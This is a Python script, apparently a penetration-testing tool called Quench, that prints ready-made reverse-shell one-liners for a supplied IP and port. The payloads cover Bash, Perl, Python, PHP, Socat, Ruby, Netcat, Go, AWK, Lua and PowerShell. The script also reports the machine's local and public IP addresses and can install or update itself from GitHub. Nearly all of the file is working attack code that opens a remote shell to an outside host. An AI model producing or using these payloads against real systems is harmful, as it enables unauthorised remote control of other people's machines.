#!/usr/bin/python3
import os
import sys
import getopt
import subprocess
import requests
import pathlib

def main(argv):
   global ipaddress
   info = """Arguments:\n  -i, --ip ==> IP Address\n  -p, --port ==> Port Number\n  -t, --type ==> Payload Type\n  --update ==> Update To The Latest Version\n  --install ==> Install To '/usr/local/bin/' Directory\nUsage:\n  quench -i <IP Address> -p <Port Number> -t <Payload Type>\n  quench -i 127.0.0.1 -p 4444 -t php\n  quench --ip 192.168.1.1 --port 1337 --type awk\n  quench --update\n  quench --install\nPayload Types:\n  Bash ==> sh\n  Perl ==> pl\n  Python ==> py\n  Socat ==> sc\n  PHP ==> php\n  Ruby ==> rb\n  Netcat ==> nc\n  Golang ==> go\n  AWK ==> awk\n  Lua ==> lua\n  PowerShell ==> ps"""
   ip = ''
   port = ''
   file = pathlib.Path("/usr/local/bin/quench")
   url = "https://enesozeser.com/"
   timeout = 5
   try:
       requests.get(url, timeout=timeout)
       internet = 1
   except (requests.ConnectionError, requests.Timeout):
       internet = 0
 
   if internet == 1:
     getpublic = subprocess.Popen("dig +short myip.opendns.com @resolver1.opendns.com", shell=True, stdout=subprocess.PIPE).stdout
     public = getpublic.read()
     getlocal = subprocess.Popen("hostname -I | awk '{print $1}'", shell=True, stdout=subprocess.PIPE).stdout
     local = getlocal.read()
     ipaddress = """IP Address:\n Local(eth/wlan) IP Address ==> %s\n Public IP Address ==> %s""" %(local[:-1].decode(), public[:-1].decode())
   
   if len(sys.argv) == 1:
    print(info)
    if internet == 1:
      print(ipaddress)

   try:
      opts, args = getopt.getopt(argv,"i:p:t:",["ip=","port=","type=","update","install"])
   except getopt.GetoptError:
      print(info)
      if internet == 1:
        print(ipaddress)
      sys.exit(2)

   for opt, arg in opts:
      if opt in ("-i", "--ip"):
        ip = arg

      elif opt in ("-p", "--port"):
        port = arg

      elif opt in "--update":
        if internet == 1:
           if file.exists():
               os.system('rm -f /usr/local/bin/quench')
               os.system('wget https://raw.githubusercontent.com/enesozeser/Quench/master/quench.py -P /usr/local/bin/')
               os.system('mv /usr/local/bin/quench.py /usr/local/bin/quench')
               os.system('chmod a+x /usr/local/bin/quench')
               os.system('sleep 2')
               print("Quench is updated. Use 'quench' command for all information.")
           else:
               print("Quench is not installed. Use './quench --install' command before updating.")
        else:
            print("Quench could not be updated. Check your internet connection.")
               
      elif opt in "--install":
          if file.exists():
              print("Quench is already installed. Use 'quench' command for all information.")
          else:
              os.system('cp quench.py /usr/local/bin/')
              os.system('mv /usr/local/bin/quench.py /usr/local/bin/quench')
              os.system('chmod a+x /usr/local/bin/quench')
              os.system('sleep 2')
              print("Quench is installed. Use 'quench' command for all information.")

      if opt in ("-t", "--type"):
        type = arg
        if type == "sh":
            print("""Bash-TCP ==> bash -i >& /dev/tcp/%s/%s 0>&1""" %(ip,port))
            print("""Bash-TCP ==> 0<&196;exec 196<>/dev/tcp/%s/%s; sh <&196 >&196 2>&196""" %(ip, port))
            print("""Bash-UDP ==> bash -i >& /dev/udp/%s/%s 0>&1""" %(ip,port))
            print("""Bash-UDP ==> 0<&196;exec 196<>/dev/udp/%s/%s; sh <&196 >&196 2>&196""" %(ip,port))
        elif type == "pl":
            print("""Perl ==> perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" %(ip,port))
            print("""Perl ==> perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"%s:%s");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""" %(ip,port))
        elif type == "py":
            print("""Python-IPv4 ==> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'""" %(ip,port))
            print("""Python-IPv4 ==> export RHOST="%s";export RPORT=%s;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'""" %(ip,port))
            print("""Python-IPv6 ==> python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("%s",%s,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'""" %(ip,port))
            print("""Python-IPv6 ==> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""" %(ip,port))
        elif type == "php":
            print("""PHP ==> php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");'""" %(ip,port))
            print("""PHP ==> php -r '$sock=fsockopen("%s",%s);shell_exec("/bin/sh -i <&3 >&3 2>&3");'""" %(ip,port))
            print("""PHP ==> php -r '$sock=fsockopen("%s",%s);`/bin/sh -i <&3 >&3 2>&3`;'""" %(ip,port))
            print("""PHP ==> php -r '$sock=fsockopen("%s",%s);system("/bin/sh -i <&3 >&3 2>&3");'""" %(ip,port))
            print("""PHP ==> php -r '$sock=fsockopen("%s",%s);passthru("/bin/sh -i <&3 >&3 2>&3");'""" %(ip,port))
            print("""PHP ==> php -r '$sock=fsockopen("%s",%s);popen("/bin/sh -i <&3 >&3 2>&3", "r");'""" %(ip,port))
            print("""PHP ==> php -r '$sock=fsockopen("%s",%s);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""" %(ip,port))
        elif type == "sc":
            print("""Socat ==> socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s""" %(ip,port))
        elif type == "rb":
            print("""Ruby ==> ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["%s"],ENV["%s"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' """ %(ip,port))
        elif type == "nc":
            print("""Netcat-TCP ==> nc %s %s -e /bin/bash""" %(ip,port))
            print("""Netcat-UDP ==> nc --udp %s %s -e /bin/bash""" %(ip,port))
        elif type == "go":
            print("""Golang ==> echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","%s:%s");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go""" %(ip,port))
        elif type == "awk":
            print("""AWK ==> awk 'BEGIN {s = "/inet/tcp/0/%s/%s"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null""" %(ip,port))
        elif type == "lua":
            print("""Lua ==> lua -e "require('socket');require('os');t=socket.tcp();t:connect('%s','%s');os.execute('/bin/sh -i <&3 >&3 2>&3');" """ %(ip,port))
        elif type == "ps":
            print("""PowerShell ==> $client = New-Object System.Net.Sockets.TCPClient("%s",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""" %(ip,port))   
        else:
            print("You entered invalid payload type. You must to use one of these ==> sh, pl, py, socat, php, rb, nc, go, awk, lua, ps")

if __name__ == "__main__":
   main(sys.argv[1:])
